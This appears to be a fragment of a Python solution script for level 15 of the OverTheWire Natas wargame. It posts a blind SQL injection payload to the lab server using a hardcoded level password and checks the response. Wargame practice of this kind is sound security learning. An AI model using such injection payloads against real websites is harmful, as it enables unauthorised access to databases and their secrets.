import requests
import string


chars = ''.join([string.ascii_letters, string.digits])

payload = {'username': "natas16' and password is not null"}
res = requests.post('http://natas15.natas.labs.overthewire.org/',
                    auth=('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'),
                    data=payload)
content = res.text
# print(content)

if 'This user exists.' in content:
    print('Ok')
